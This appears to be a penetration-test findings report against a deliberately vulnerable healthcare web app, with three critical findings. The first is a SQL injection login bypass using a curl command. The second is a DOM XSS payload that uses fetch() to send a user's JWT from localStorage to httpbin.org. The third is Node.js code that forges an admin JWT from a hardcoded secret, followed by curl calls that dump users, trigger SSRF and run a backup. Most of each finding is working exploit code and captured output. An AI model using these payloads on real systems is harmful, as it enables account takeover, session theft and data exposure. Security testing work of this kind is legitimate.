**Summary:**

- Impact: Any attacker can obtain a valid admin JWT without knowing any password. Compromises all user accounts including the administrator account.
- Severity: Critical

**Exploitation Steps:**
1. Obtain an admin JWT without any credentials:
   ```bash
   curl -s -X POST http://host.docker.internal:3001/api/auth/login \
     -H "Content-Type: application/json" \
     -d '{"username":"admin'\''--","password":"anypassword"}'
   ```

**Proof of Impact:**
```json
{
  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
  "user": {
    "id": 1,
    "username": "admin",
    "email": "admin@vulhealth.local",
    "role": "admin",
    "fullName": "System Administrator"
  }
}
```

The backend query uses string concatenation: `SELECT * FROM users WHERE username = '${username}' AND passwordHash = '${md5(password)}'`. By injecting `'--` after the username, the password check is commented out entirely. The attacker-provided password is never verified.

**Additional Accounts Compromised:**
- `admin'--` → System Administrator (id=1, role=admin)
- `dr.smith'--` → Dr. Smith account

**Summary:**
- Vulnerable endpoint: `GET /?q=<payload>` (Landing page, `http://host.docker.internal:4000/`)
- XSS type: DOM-based (client-side only, no server reflection)
- Impact: Session hijacking via token exfiltration
- Severity: Critical

**Exploitation Steps:**
1. Navigate to `http://host.docker.internal:4000/?q=%3Cimg%20src%3Dx%20onerror%3Dfetch(...)%3E`
2. The React SPA reads `?q=` from `window.location.search` and sets it as the `value` attribute of a controlled text input
3. An `<img src=x>` tag is also rendered below the search box with the payload value
4. When the broken image loads (`src=x` fails), the `onerror` handler fires
5. The `onerror` handler executes: `fetch('https://httpbin.org/get?t='+encodeURIComponent(localStorage.getItem('token')))`
6. The JWT token from localStorage is exfiltrated to `https://httpbin.org/get`

**Proof of Impact:**
- Network logs confirm the exfiltration request was sent:
  ```
  [GET] https://httpbin.org/get?t=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9... => [200]
  ```
- Token stolen: `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6NzMsInVzZXJuYW1lIjoieHNzYXR0YWNrZXIxIiwicm9sZSI6InBhdGllbnQiLCJlbWFpbCI6Inhzc2F0dGFja2VyMUB0ZXN0LmNvbSJ9.GvhZq0sXZTnTpwHOv-hZQfz7zd-qq0QGnF_2Z3uFyTU`
- `token` is stored without `HttpOnly`, so `localStorage.getItem('token')` returns the full JWT
- No CSP or sanitization on the landing page — any URL-encoded payload executes immediately
- Any user visiting a crafted link has their session token stolen

**Summary:**

- Vulnerability type: JWT Forgery
- Impact: Full unauthenticated admin access — all user records with MD5 password hashes exposed, arbitrary host SSRF via ping, database backup execution

**Exploitation Steps:**

1. Forge an admin JWT using the hardcoded HMAC secret "secret":
```javascript
// Node.js / Crypto forging
const crypto = require('crypto');
const header = { alg: 'HS256', typ: 'JWT' };
const payload = { id: 1, username: 'admin', role: 'admin', email: 'admin@vulhealth.local' };
const headerB64 = Buffer.from(JSON.stringify(header)).toString('base64url');
const payloadB64 = Buffer.from(JSON.stringify(payload)).toString('base64url');
const data = headerB64 + '.' + payloadB64;
const sig = crypto.createHmac('sha256', 'secret').update(data).digest('base64url');
const forgedToken = data + '.' + sig;
// Result: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwidXNlcm5hbWUiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiIsImVtYWlsIjoiYWRtaW5AdnVsaGVhbHRoLmxvY2FsIn0.DPk4QDMhSwQLRjzENVlDVY00Xuljai1vKS1WeIM7LLg
```

2. Use forged token to access all admin endpoints — no credentials needed:
```bash
# Read all user records with MD5 password hashes
curl -s http://host.docker.internal:3001/api/admin/users \
  -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwidXNlcm5hbWUiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiIsImVtYWlsIjoiYWRtaW5AdnVsaGVhbHRoLmxvY2FsIn0.DPk4QDMhSwQLRjzENVlDVY00Xuljai1vKS1WeIM7LLg"

# Trigger SSRF ping to arbitrary host
curl -s -X POST http://host.docker.internal:3001/api/admin/ping \
  -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwidXNlcm5hbWUiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiIsImVtYWlsIjoiYWRtaW5AdnVsaGVhbHRoLmxvY2FsIn0.DPk4QDMhSwQLRjzENVlDVY00Xuljai1vKS1WeIM7LLg" \
  -H "Content-Type: application/json" \
  -d '{"host":"example.com"}'

# Execute database backup
curl -s -X POST http://host.docker.internal:3001/api/admin/backup \
  -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwidXNlcm5hbWUiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiIsImVtYWlsIjoiYWRtaW5AdnVsaGVhbHRoLmxvY2FsIn0.DPk4QDMhSwQLRjzENVlDVY00Xuljai1vKS1WeIM7LLg" \
```
